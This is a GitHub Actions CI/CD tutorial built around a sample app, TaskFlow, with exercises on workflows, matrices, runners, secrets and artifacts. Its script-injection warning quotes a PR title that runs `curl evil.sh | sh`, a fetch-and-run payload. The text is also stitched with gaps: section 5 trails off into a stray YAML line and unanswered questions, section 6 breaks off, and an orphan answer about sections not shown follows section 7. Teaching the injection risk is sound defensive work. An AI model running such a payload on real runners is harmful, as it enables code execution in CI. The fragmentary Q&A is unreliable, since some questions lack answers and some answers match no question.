1 CI vs CD & the CI/CD pipeline

The problem: merge Friday

Four people build TaskFlow. Each works on a branch for two weeks, runs the tests when they remember, and merges on Friday:

Mon  Aarav  feat/due-date   POST /tasks now accepts a dueDate
Tue  Diya   feat/priority   adds a dependency, forgets to commit package-lock.json
Wed  you    fix/health      "works on my laptop" (you didn't run the tests)
Fri  merge all three into main
     npm error `npm ci` can only install packages when your package.json and package-lock.json … are in sync
     Tests: 3 failed, 9 passed          ← three changes, one red build: whose fault?

The longer branches live apart, the worse the merge. And the release is one person's afternoon: build on a laptop, push, SSH in, hope.

The idea

Continuous Integration (CI): merge small changes into main often and let a machine build and test every push and PR, so a break shows up within minutes, pinned to one commit. Continuous Delivery also packages each passing change and deploys it to staging: main is always releasable, and production is one approved click away. Continuous Deployment removes the click.

 push / PR
    │
    ▼
 build ─▶ test ─▶ scan ─▶ package ─▶ staging ─▶ [approve] ─▶ production
 └─── CI ────┘
 └────────── Continuous Delivery ──────────┘  then a human approves
 └────────────────────── Continuous Deployment ───────────────────────┘  no human
Think of it like this

A restaurant kitchen, used all page. CI is the head chef tasting every pot as soon as a cook changes the recipe, not the whole menu on Friday night. Delivery is each dish that passes waiting, plated, until a waiter sends it out. Deployment is a conveyor belt from the pass to the table.

See it: a verdict per commit

The smallest useful CI runs lint and tests on every PR and reports ✓ or ✗ for that commit. Aarav's PR #12, a minute after he pushed:

$ gh pr checks 12

X  CI/test (22)               36s      https://github.com/shauryav/taskflow/actions/runs/18233114562/job/52009988773

He learns his change broke the tests before anyone merges it; you'll write this workflow by section 8 and fix this failure in section 9. What it does not do: CI fixes nothing and, alone, deploys nothing. It only catches what your checks check: an untested feature sails through.

Build it up: the pipeline

A pipeline is that ordered list of stages. Cheap checks go first, so a 20-second lint error doesn't wait behind a 2-minute image build:

StageTaskFlow commandTypical failure it catches
Buildnpm cipackage.json and package-lock.json out of sync (Diya's bug); missing dependency
Testnpm run lint, npm testSyntax/style errors; POST /tasks returns 201 for an empty title (Aarav's bug)
Scan (Session 19)npm audit, gitleaks, TrivyVulnerable express, a committed AWS key, CVEs in the base image
Packagedocker build + smoke testBroken Dockerfile, container crashes on start, /health not 200
Deploy (Session 19)helm upgrade --install --atomicPods never Ready (bad env/secret) → automatic rollback
  • Build once, promote the same artifact: the image tested in staging is the one that reaches prod. Config comes from env vars, never a rebuild.
  • Pipeline as code: it lives in the repo (.github/workflows/*.yml) and is reviewed in PRs. GitLab CI (.gitlab-ci.yml), Jenkins (Jenkinsfile), CircleCI and Azure Pipelines work the same way.

Exam trap

"Continuous Delivery means every commit goes to production automatically." ✗ That's Continuous Deployment. Delivery keeps every commit releasable; a human releases.

"We use GitHub Actions, so we do CI." ✗ CI is a practice: small changes integrated into main often, each verified automatically. Monthly merges aren't CI, whatever runs the tests.

Remember

CI = every change built + tested automatically.
Delivery = always releasable, a human presses deploy · Deployment = no human.
Fail fast: cheap checks first.

Mastery check
Q1. Every merge to main deploys to staging automatically; production needs the team lead to click "Approve". CI, Continuous Delivery or Continuous Deployment?

Continuous Delivery (with CI underneath): scripted deploys and an always-ready artifact, but a human gates production. Drop the approval and it's Continuous Deployment.

Q2. Your professor says: "Rebuild the image for production with production settings, so each environment is optimised." Agree?

No. A rebuild can pick up a different base image or dependency, so prod would run bytes staging never tested. Build once, promote the image, and put differences in config.

Q3. A PR adds a DELETE /tasks endpoint with no tests. CI is green. Is the endpoint safe to ship?

CI can't say. Green means "nothing we test broke", because CI only runs the checks you wrote. Add a test for the endpoint.

2 GitHub Actions: your first workflow & triggers

The problem

You want a robot to run TaskFlow's tests on every push. Three questions: where does it run (your laptop sleeps at night), what starts it, and how does it get your code? GitHub Actions answers all three with one YAML file in the repo.

The idea

An event (push, PR, schedule, button) triggers a workflow: a YAML file in .github/workflows/. GitHub hands each job in it to a runner, a fresh VM, which executes the job's steps in order. A step runs a shell command (run:) or a reusable action (uses:).

event (push, pull_request, schedule, workflow_dispatch)
   │ triggers one "run" of
   ▼
WORKFLOW   .github/workflows/ci.yml        one YAML file = one workflow
   ├── JOB lint    runs-on: ubuntu-latest    each job gets its own fresh runner VM
   │     ├── STEP  uses: actions/checkout@v4      ← an ACTION: reusable code (owner/repo@version)
   │     ├── STEP  uses: actions/setup-node@v4
   │     └── STEP  run: npm run lint              ← a shell command
   └── JOB test    …                         jobs run in PARALLEL unless chained (section 3)
Think of it like this

The workflow is a recipe card pinned in the repo; the event is an order ticket. The runner is a rented kitchen, empty and spotless, thrown away after each job. A job is one cook in one kitchen, steps are the recipe lines, and an action is a gadget someone else built.

See it: the smallest workflow

.github/workflows/hello.yml
name: Hello
on: [push, workflow_dispatch]
jobs:
  hello:
    runs-on: ubuntu-latest
    steps:
      - name: Say hello
        run: |
          echo "Hello ${{ github.actor }} from ${{ runner.os }}"
          echo "Commit $GITHUB_SHA on $GITHUB_REF_NAME"
          ls
LineMeaning
name: HelloName in the Actions tab
on: [push, workflow_dispatch]Every push to any branch, plus a "Run workflow" button
jobs: → hello: → runs-on: ubuntu-latestOne job, id hello (your choice), on a GitHub-hosted Ubuntu VM (section 5)
steps: → - name: → run: |Steps in order; name labels the log; | makes the indented lines one bash script
${{ github.actor }} vs $GITHUB_SHA${{ }} is filled in by GitHub before the script starts; $GITHUB_SHA is an env var bash reads (section 4)
 
$ git add .github/workflows/hello.yml && git commit -m "ci: hello workflow" && git push
$ gh run list --workflow hello.yml --limit 1
STATUS  TITLE               WORKFLOW  BRANCH  EVENT  ID           ELAPSED  AGE
✓       ci: hello workflow  Hello     main    push   18231904410  9s       less than a minute ago
$ gh run view 18231904410 --log | grep 'Say hello'          # trimmed to the script's output
hello  Say hello  2026-10-09T06:41:12.4128834Z Hello shauryav from Linux
hello  Say hello  2026-10-09T06:41:12.4130021Z Commit 4f2a9c1e8b7d6a5f4e3d2c1b0a9f8e7d6c5b4a39 on main

Green. But ls printed nothing: the working folder is empty.

What it does not do: fetch your code. A runner starts blank; cloning is a step you ask for:

    steps:
      - uses: actions/checkout@v4     # clone the commit that triggered this run
      - name: Say hello
        run: …                        # same script; ls now prints Dockerfile, compose.yaml, k8s …

actions/checkout is the checkout repo of GitHub's actions org, @v4 its version. It clones into $GITHUB_WORKSPACE (/home/runner/work/taskflow/taskflow). In real CI a missing checkout isn't silent: setup-node with cache: npm fails with Dependencies lock file is not found, and without the cache npm ci fails with EUSAGE … can only install with an existing package-lock.json.

Build it up: choosing when it runs

on: [push] fires on every push to every branch. Real workflows narrow it:

on:
  push:
    branches: [main]                 # only pushes to main (globs work: 'release/**')
    tags: ['v*']                      # …or pushing a tag like v1.2.0
    paths-ignore:                    # skip the run when ONLY these files changed
      - '**.md'
      - 'docs/**'
  pull_request:
    branches: [main]                 # PRs whose TARGET is main (opened, new commits, reopened)
  workflow_dispatch:                 # manual run: button in the UI, or gh workflow run
    inputs:
      reason:
        description: Why are you running this?
        type: string
        default: manual
  schedule:
    - cron: '30 2 * * 1'              # min hour day month weekday, in UTC → Mon 02:30 UTC = 08:00 IST
EventUseGotcha
pushCI on branches, releases on tagspaths or paths-ignore per event, not both.
pull_requestCheck a PR before mergeRuns on a test merge commit (refs/pull/12/merge). Fork PRs get no secrets, read-only token.
workflow_dispatchManual runs with inputs (${{ inputs.reason }})The button appears only once the file is on the default branch.
scheduleNightly builds, weekly checksUTC, default branch only, may start late; minimum interval 5 min.
release, workflow_callOn a GitHub Release / reusable workflows—

Invalid YAML (tabs, a mis-indented on:) shows "Invalid workflow file" with the line number in the Actions tab; actionlint or an editor YAML plugin catches it before you push.

About the @v4 version pins

This course pins actions/checkout@v4, setup-node@v4, upload-artifact@v4/download-artifact@v4. Newer majors exist (Oct 2026: checkout v7, setup-node v7, upload-artifact v7, download-artifact v8), mainly a move to the Node 24 runtime; the inputs used on this page are unchanged. Since 23 Sep 2026 GitHub runs every JavaScript action on Node 24 and recommends upgrading old majors. For a new repo, check each action's Releases page and use the latest major. Never use @main.

Exam trap

"Actions clones your repo onto the runner automatically." ✗ Only actions/checkout does, as the silent ls proved.

"cron: '30 2 * * 1' runs at 02:30 in India." ✗ Schedules are UTC: 08:00 IST.

Remember

event → workflow → jobs (own runner each) → steps (uses an action or run a command).
The runner starts empty: checkout first.

Mastery check
Q1. A workflow has only on: pull_request with branches: [main]. You push straight to main. Does it run?

No. A direct push is a push event; this workflow only runs when a PR targeting main is opened, reopened or updated.

Q2. Spot the bug: the file is .github/workflow/ci.yml, and nothing ever appears in the Actions tab.

The folder must be .github/workflows/ (plural). GitHub looks nowhere else.

Q3. Predict: push has paths-ignore: ['**.md'], pull_request has no filter. A PR edits only README.md. Does CI run on the PR? On main after merging?

On the PR, yes: no path filter there. On main, no: the merge commit only changed a .md file, so the push trigger skips it.

3 Jobs & steps

The problem

TaskFlow's first real CI is one job that does everything, calling the package.json scripts "lint": "eslint ." and "test": "jest" (Jest + supertest tests in test/):

.github/workflows/ci.yml (first version)
name: CI
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 20, cache: npm }   # flow style: same as two indented lines
      - run: npm ci
      - run: npm run lint
      - run: npm test

A lint error stops the job, so you can't see whether the tests pass until lint is fixed. You also want an image build that runs only after lint and tests pass. And a puzzle:

      - run: cd test
      - run: ls                # prints Dockerfile, package.json … the repo root, not test/

The idea

Steps run one after another on the same runner: shared files, but every run: is a new shell process. Jobs run in parallel, each on its own runner, sharing nothing. needs: makes a job wait for others, turning jobs into a graph.

 job lint  (runner A)  checkout → setup-node → npm ci → npm run lint ─┐
                                                                      ├─▶ job build  (runner C)  needs: [lint, test]
 job test  (runner B)  checkout → setup-node → npm ci → npm test ─────┘   checkout → docker build → smoke test

 steps of one job: in order, same machine, same files    jobs: in parallel, different machines, nothing shared
Think of it like this

Jobs are cooks in separate kitchens working at once; steps are one cook's recipe lines, in order. needs: is "don't plate until the sauce and dessert cooks are done". Cooks never share a counter, which matters in section 7.

See it: inside one job

    steps:
      - name: Set up Node                    # label in the log
        uses: actions/setup-node@v4          # an ACTION; inputs go under with:
        with:
          node-version: 20
          cache: npm
      - name: Install
        run: npm ci                          # a SHELL command
      - name: Unit tests
        id: tests                            # lets later steps read steps.tests.outcome / outputs
        run: npm test
        working-directory: ./                # cd for this step only
        env:
          NODE_ENV: test                     # env var for this step only
        continue-on-error: false             # true = the job carries on if this fails

That solves the puzzle: each run: is a new process, so cd, export and shell variables die with it. Use working-directory: for folders, and pass values on through two special files:

      - run: echo "TAG=sha-${GITHUB_SHA::7}" >> "$GITHUB_ENV"    # env var for every LATER step of this job
      - run: echo "Building $TAG"                                 # → Building sha-4f2a9c1
      - id: meta
        run: echo "tag=sha-${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"  # step output: ${{ steps.meta.outputs.tag }}

${GITHUB_SHA::7} is bash for "first 7 characters". The default Linux shell is bash -e (stop at the first failing command); shell: bash adds -o pipefail so failures inside pipes count too.

What it does not do: carry on after a failure. The job stops at the failed step; later steps are skipped unless their if: says otherwise.

Build it up: three jobs

jobs:
  lint:
    runs-on: ubuntu-latest
    timeout-minutes: 5                         # default is 360 (6 h!), so always set it
    steps: [...]
  test:
    runs-on: ubuntu-latest                     # no needs → parallel with lint
    steps: [...]
  build:
    needs: [lint, test]                        # waits for BOTH; skipped if either fails
    if: github.event_name != 'schedule'        # job-level condition
    runs-on: ubuntu-latest
    steps:
      - run: ./build.sh
      - name: Dump logs on failure
        if: failure()                          # only when an earlier step failed
        run: docker logs api
      - name: Always clean up
        if: always()                           # even after a failure or cancel
        run: docker rm -f api || true
if: status functionThe step/job runs when…
success() (the default)All previous steps / needed jobs succeeded
failure()Any previous step / needed job failed
always()Always, even if the run was cancelled
cancelled()The run was cancelled

Passing a value to another job: outputs

  build:
    runs-on: ubuntu-latest
    outputs:
      tag: ${{ steps.meta.outputs.tag }}          # 2) expose the step output as a JOB output
    steps:
      - id: meta
        run: echo "tag=sha-${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"   # 1) step output: tag=sha-4f2a9c1
  publish:
    needs: build                                    # needs.X only works for jobs listed here
    runs-on: ubuntu-latest
    steps:
      - run: echo "Publishing ${{ needs.build.outputs.tag }}"   # 3) read it → Publishing sha-4f2a9c1

Outputs carry short strings between jobs; files need artifacts (section 7).

Exam trap

"A job's steps run in parallel; jobs run in order." ✗ The reverse: steps are sequential, jobs parallel unless needs: chains them.

"build is a separate job, so it still runs when lint fails." ✗ With needs: [lint, test] it's skipped, unless its if: uses always() or failure().

Remember

Steps = in order, same runner, new shell each · Jobs = in parallel, separate runners.
needs = wait for · if = only when · outputs = pass a value.

Mastery check
Q1. Predict: lint and test have no needs; build has needs: [lint, test]. Lint fails after 20 s; tests pass after 40 s. Final status of each?

lint ✗, test ✓, build skipped. Jobs are independent, so lint failing doesn't cancel test (only a matrix cancels siblings). Build never starts because one of its needs failed.

Q2. One step runs export TAG=v1; the next runs echo $TAG and prints an empty line. Why, and what's the fix?

Each run: is its own shell, so the export died with the first step. Write echo "TAG=v1" >> "$GITHUB_ENV", and GitHub sets it for every later step.

Q3. The smoke-test step fails. Which later steps still run: one with no if, one with if: failure(), one with if: always()?

The failure() and always() steps. No if means success(), so it's skipped; that's why a log-dumping step needs if: failure().

4 Matrix, expressions & concurrency

The problem

TaskFlow runs on Node 20 (end-of-life since April 2026); does it work on 22 and 24? Three copies of the test job means three places to edit forever. And three quick pushes to a PR queue three full runs, though only the last matters.

The idea

A matrix turns one job definition into one job per combination of values, each with ${{ matrix.node }} filled in. ${{ … }} is an expression: GitHub evaluates it from contexts (github, matrix, secrets…) and pastes the result in before the step runs. Concurrency groups runs so a new one cancels or queues behind the old one.

 test:                                    ┌▶ test (20)   ubuntu VM, Node 20 ┐
   strategy.matrix.node: [20, 22, 24] ────┼▶ test (22)   ubuntu VM, Node 22 ├─ all in parallel
   node-version: ${{ matrix.node }}       └▶ test (24)   ubuntu VM, Node 24 ┘
Think of it like this

Same recipe, three ovens: write the card once, fire it in three ovens at once. ${{ matrix.node }} is the temperature written on each copy.

See it: the smallest matrix

  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node: [20, 22, 24]             # one variable, three values → three jobs
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}   # 20, then 22, then 24
      - run: npm ci
      - run: npm test

The jobs are named test (20), test (22), test (24), the names branch protection requires later (section 9).

What it does not do: wait for all three. fail-fast defaults to true, so if test (24) fails first the other two are cancelled and you never learn about 20 and 22. For compatibility testing, set fail-fast: false.

Build it up

Two dimensions, minus one combination

  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false                 # default true = cancel the others when one fails
      max-parallel: 4
      matrix:
        os: [ubuntu-latest, windows-latest]
        node: [20, 22, 24]               # 2 × 3 = 6 jobs
        exclude:
          - os: windows-latest
            node: 24                     # → 5 jobs
        include:
          - os: ubuntu-latest
            node: 24
            coverage: true               # extra variable for one combination only

Jobs are named test (ubuntu-latest, 20) and so on. Node 22 and 24 are the current LTS lines.

Contexts and expressions

In if: you may drop the ${{ }}. These values differ between a push and a PR:

ExpressionPush to mainPull request #12
github.event_namepushpull_request
github.refrefs/heads/mainrefs/pull/12/merge
github.ref_namemain12/merge (the PR's branch is github.head_ref)
github.shaThe pushed commit (4f2a9c1e…)The test merge commit
github.repository / github.actorshauryav/taskflow / shauryav
github.run_number1, 2, 3… per workflow
runner.osLinux, Windows, macOS

Other contexts: env, vars, secrets, matrix, needs, steps, inputs. Functions: contains(), startsWith(github.ref, 'refs/tags/v'), hashFiles('**/package-lock.json'), format(), toJSON(). Most values are also env vars in run: ($GITHUB_SHA, $GITHUB_REF_NAME, $RUNNER_OS).

Concurrency: one run per branch

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}                 # e.g. "CI-refs/pull/12/merge"
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}  # cancel stale PR runs; main runs queue instead

A new push to PR #12 joins the group and cancels the stale run. On main the expression is false, so a new run waits rather than killing a half-finished publish.

Common mistake: script injection

run: echo "${{ github.event.pull_request.title }}" pastes attacker-controlled text into your script before bash sees it: a PR titled "; curl evil.sh | sh; " runs that command. Pass untrusted values via env: and use "$TITLE".

Exam trap

"fail-fast: false runs matrix jobs one after another." ✗ It only stops one failure cancelling the rest; max-parallel limits how many run at once.

"${{ }} is evaluated by bash." ✗ GitHub substitutes the text before the shell starts, which is why injection works.

Remember

matrix = one job definition × N values → N parallel jobs.
${{ }} = filled in by GitHub before the step runs.
concurrency: cancel stale PR runs, never main.

Mastery check
Q1. os: [ubuntu-latest, windows-latest] × node: [20, 22, 24], excluding windows + 24, default fail-fast. How many jobs start, and what happens when test (ubuntu-latest, 22) fails?

5 jobs. With the default fail-fast: true, every matrix job still running is cancelled, so you see one real failure and several "cancelled".

Q2. You push three commits to PR #12 within a minute, with the concurrency block above. How many runs finish?

One, the last. All three share CI-refs/pull/12/merge and PRs cancel in progress, so each run cancels the one before.

Q3. Spot the bug: if: github.ref_name == 'feat/due-date' never matches on the PR from that branch.

On pull_request, github.ref_name is 12/merge. The source branch is github.head_ref.

5 Runners

The problem

Two puzzles. A job has said "Waiting for a runner to pick up this job…" for an hour. And a deploy job can't reach the minikube cluster on your laptop. Both are about which machine runs a job.

The idea

A runner is any machine running GitHub's runner agent, which polls GitHub over outbound HTTPS for a job whose runs-on labels it matches, runs the steps and streams logs back. GitHub-hosted runners are fresh VMs, one per job, deleted afterwards. Self-hosted runners are your machines and keep their state.

 GitHub job queue                                  runners poll for work (outbound HTTPS only)
   test    runs-on: ubuntu-latest                ◀── GitHub-hosted VM (fresh per job, deleted after)
   deploy  runs-on: [self-hosted, linux, minikube] ◀── your Ubuntu laptop running ./run.sh
   train   runs-on: [self-hosted, gpu]             ✗ nobody has "gpu" → "Waiting for a runner…" forever

Puzzle 1 solved: no online runner has all the labels in runs-on. Puzzle 2 is the network: a GitHub-hosted VM in GitHub's cloud can't reach your laptop's private IP (Session 19 shows the error).

Think of it like this

GitHub-hosted is a rented kitchen: spotless each time, standard kit, nothing from yesterday, no way into your house. Self-hosted is your own kitchen: tools stay put and it can reach your fridge (private network), but you clean it, and if strangers can order, they cook in your house.

See it: which machine ran my job?

Every job log starts with a Set up job step that tells you (trimmed):

Current runner version: '2.338.0'
Runner Image
  Image: ubuntu-24.04
GITHUB_TOKEN Permissions
  Contents: read

The image ships git, Docker, Node, Python, Java, kubectl, helm, the AWS/Azure CLIs and gh. Labels: ubuntu-latest (moves to newer Ubuntu LTS over time, so pin ubuntu-24.04 for stability), ubuntu-22.04, ubuntu-24.04-arm, windows-latest, macos-latest.

What it does not do: remember anything. The next job gets a new VM; files, images and node_modules are gone. Hence artifacts and caches (section 7).

  deploy-local:

Exam trap

Mastery check
Q1. Diagnose: runs-on: [self-hosted, linux, minikube] waits forever. You registered the runner on your Mac with --labels minikube, and it shows "Idle".

A macOS runner is labelled self-hosted, macOS, ARM64, not linux, and every label must match. Use [self-hosted, macOS, minikube] or a Linux runner.

Q2. Pick a runner type: (a) unit tests on a public repo, (b) deploying to minikube on your laptop, (c) a job that needs a GPU.

(a) GitHub-hosted: free, clean, safe for fork PRs. (b) Self-hosted on the laptop (private repo), the only machine that reaches the cluster. (c) Self-hosted with a gpu label, or a paid larger GitHub runner.

Q3. The second CI run is no faster than the first. A teammate says "the runner should still have node_modules". Right?

6 Secrets, variables & GITHUB_TOKEN

The problem

The last job pushes TaskFlow's image to Docker Hub, which needs a password. Paste the token into ci.yml and every reader, every fork and the git history has it forever. So you reference a secret instead, push, and get:

Run docker/login-action@v3
Error: Username and password required

The workflow asked for secrets.DOCKERHUB_TOKEN, nobody had stored one, so it came back empty.

The idea

Secrets are values encrypted in GitHub's settings: injected only when a step asks, masked as *** in logs, and write-only. Variables hold plain-text config. Every job also gets a short-lived GITHUB_TOKEN, limited by permissions:. An environment adds its own secrets plus an approval gate.

 Settings → Secrets and variables → Actions
   secret    DOCKERHUB_TOKEN     encrypted, write-only ──▶ ${{ secrets.DOCKERHUB_TOKEN }} ┐

Think of it like this

The manager's safe: a cook may use the key but not take it home, and reading it aloud gets bleeped (***). GITHUB_TOKEN is a day pass printed per shift; permissions: lists the doors it opens. An environment is the VIP room, with its own key and a head chef who signs you in.

See it: store a secret, use it

Q3. gh pr comment fails with "Resource not accessible by integration"; the workflow sets permissions: contents: read. What's missing?

7 Artifacts & caching

The problem

build builds shauryav/taskflow-api:sha-4f2a9c1 and smoke-tests it. Then publish (needs: build) logs in with the secret and pushes:

Run docker push "shauryav/taskflow-api:sha-4f2a9c1"
The push refers to repository [docker.io/shauryav/taskflow-api]
An image does not exist locally with the tag: shauryav/taskflow-api
Error: Process completed with exit code 1.

The image was built a minute ago. Where did it go? Also, every run spends ~19 s downloading the same 312 npm packages.

The idea

Jobs run on different VMs (section 3), so publish never had the image. An artifact is a file or folder a job uploads into the run's storage, for later jobs of that run (and people) to download. A cache is a folder saved under a key and restored in later runs to speed them up.

 run #41
 job build ── upload-artifact ──▶ [ run storage, 1–90 days ] ── download-artifact ──▶ job publish
   image.tar.gz                                                                       docker load → push
 run #41 → run #42
 job test  ── save ──▶ [ cache Linux-npm-<hash of package-lock.json> ] ── restore ──▶ job test
   ~/.npm                                                                             4 s instead of 19 s

 artifact = OUTPUTS, passed within a run (and downloadable)    cache = INPUTS, reused across runs
Think of it like this

Cooks never share a counter, so the finished dish goes through the hatch: an artifact. The cache is the pantry of pre-chopped onions kept between shifts; lose it and dinner is slower, not cancelled.

See it: upload one report

      - name: Upload coverage report
        if: always()                                 # keep the report even when tests fail
        uses: actions/upload-artifact@v4
        with:
          name: coverage-node${{ matrix.node }}      # unique per matrix job
          path: coverage/                            # a file, folder or glob; several lines allowed
          retention-days: 7                          # default 90
          if-no-files-found: error                   # default warn
$ gh run download 18233456789 -n coverage-node20 -D ./coverage-node20
$ ls coverage-node20
clover.xml  coverage-final.json  lcov-report  lcov.info

In v4, names must be unique within a run and artifacts are immutable, hence ${{ matrix.node }} in the name.

What it does not do: deliver the files. A later job gets nothing until it runs download-artifact, and it must needs: the uploader so the upload is done.

Build it up

Hand the tested image to publish

  build:
    steps:
      …                                                     # build + smoke test (section 8)
      - name: Save image
        run: docker save "$IMAGE:${{ steps.meta.outputs.tag }}" | gzip > image.tar.gz
      - uses: actions/upload-artifact@v4
        with: { name: image, path: image.tar.gz, retention-days: 1 }   # only needed for this run
  publish:
    needs: build
    steps:
      - uses: actions/download-artifact@v4
        with: { name: image }                               # lands in the workspace as image.tar.gz
      - run: docker load -i image.tar.gz                    # the exact bytes build smoke-tested

Failure paid off: publish now pushes the image that passed the smoke test, without rebuilding. To gather all matrix reports in one job, use download-artifact with pattern: coverage-* and merge-multiple: true.

Cache: faster installs

setup-node with cache: npm caches ~/.npm keyed on the hash of package-lock.json, usually all you need. The general form:

      - uses: actions/cache@v4
        with:
          path: ~/.npm
          key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}   # exact hit while the lockfile is unchanged
          restore-keys: |
            ${{ runner.os }}-npm-                                             # fallback: newest partial match

Common mistakes
  • Matrix jobs uploading one name → Conflict: an artifact with this name already exists on the workflow run. Add ${{ matrix.node }}.
  • cache: npm with no committed lockfile → Dependencies lock file is not found in /home/runner/work/taskflow/taskflow. Supported file patterns: package-lock.json,npm-shrinkwrap.json,yarn.lock. Commit it.
  • Caching node_modules instead of ~/.npm: npm ci deletes node_modules first anyway.
Exam trap

"Use the cache to pass the built image to the next job." ✗ A cache can miss or be evicted, which would break the run. Within a run, files travel as artifacts.

"Steps of one job need artifacts to share files." ✗ Steps share the runner's disk; artifacts cross between jobs.

Remember

Artifact = outputs, handed between jobs or downloaded.
Cache = inputs, reused across runs; a miss is only slower.

Mastery check
Q1. Artifact or cache: (a) the Jest coverage report, (b) ~/.npm, (c) the image tarball for publish?

(a) Artifact, an output to keep. (b) Cache, an input; a miss only slows the install. (c) Artifact: the next job needs it and can't rely on a cache hit.

Q2. Predict: the key is Linux-npm-${{ hashFiles('**/package-lock.json') }}. You change only server.js; later you add a dependency. Hit or miss each time?

server.js: exact hit, lockfile unchanged. New dependency: the exact key misses, restore-keys restores the newest Linux-npm- cache, npm downloads only the new packages, and a new cache is saved.

Q3. Why does publish load the tarball instead of running docker build again?

To push exactly the bytes that passed the smoke test. A rebuild could pull a newer base image or dependency and ship something untested.

test (24) never reports, so PRs sit at "Expected — Waiting for status to be reported" and can't merge. Update required checks when you rename or remove jobs.

Q3. act passes on your laptop, but the same job fails on GitHub. Give two likely reasons.

act's images have fewer or different tools than GitHub's runner image; act has no real GITHUB_TOKEN, secrets or environment rules; and your arm64 Mac isn't the amd64 runner.

★ Putting it all together

The big idea

CI checks every TaskFlow change automatically; CD keeps a tested artifact ready (delivery) or ships it (deployment). An event starts a workflow; its jobs run in parallel on fresh runners unless chained with needs, and each step uses an action or runs a command. Values cross jobs as outputs, files as artifacts, passwords as masked secrets. ci.yml lints, tests on Node 20/22/24, smoke-tests the image and pushes it from main only. Session 19 adds scans, GHCR and a Helm deploy.

Final mastery check — combine everything

Q1 is about this workflow:

on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-node@v4
        with: { node-version: 20, cache: npm }
      - run: npm ci && npm test
  publish:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ secrets.DOCKERHUB_TOKEN }}" | docker login -u shauryav --password-stdin
      - run: docker push shauryav/taskflow-api:latest
Q1. Spot every bug in the workflow above (there are at least five).

(1) No checkout: setup-node fails with "Dependencies lock file is not found". (2) publish lacks needs: test, so it pushes even if tests fail. (3) No image exists on publish's VM; build it in a job and pass it as an artifact. (4) It runs on pull_request: fork PRs get no secrets, and unmerged code shouldn't ship; publish on a push to main. (5) The secret is pasted into the script; use env: or docker/login-action. (6) :latest hides which commit it is; tag with the SHA.

Q2. Walk a push to main through ci.yml: how many runner VMs start, which jobs run in parallel, and how does the image reach Docker Hub?

Six VMs. lint and the three test jobs run together. Then build builds sha-4f2a9c1, smoke-tests it, uploads image.tar.gz and outputs the tag. publish downloads and loads it, logs in with the variable + secret, and pushes needs.build.outputs.tag.

Q3. What would you add to ci.yml to make TaskFlow Continuous Delivery, and what one change makes it Continuous Deployment?

A deploy job (needs: publish, main only) with environment: production requiring a reviewer, so the run waits for approval. Removing the reviewer rule makes it Continuous Deployment.

Q4. Every PR is green, but the first push to main fails at publish with "Username and password required". You did run gh secret set. Why didn't a PR catch it, and what do you check?

PRs never run publish (its if: needs a push to main). Compare gh secret list with the exact name in the YAML, and check it isn't an environment secret (--env) while publish has no environment:.

Q5. A teammate renames the coverage artifact to plain coverage. Predict the status of the three test jobs and of build.

The first test job to finish uploads it; the other two fail with Conflict: an artifact with this name already exists. One green, two red, so build is skipped. Fix: coverage-node${{ matrix.node }}.
